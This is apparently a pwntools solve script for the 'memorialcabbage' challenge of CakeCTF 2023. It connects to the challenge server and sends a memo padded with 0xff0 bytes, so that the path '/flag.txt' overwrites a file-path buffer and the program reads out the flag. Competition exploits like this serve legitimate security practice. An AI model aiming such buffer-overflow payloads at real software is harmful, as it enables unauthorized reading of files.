from pwn import *

elf = ELF('./cabbage')
#io = process(elf.path)
io = remote('memorialcabbage.2023.cakectf.com', 9001)

context.binary = elf

payload = b'a' * 0xff0 + b'/flag.txt\x00'
io.sendlineafter('> ', '1')
io.sendlineafter('Memo: ', payload)

io.sendlineafter('> ', '2')

io.interactive()

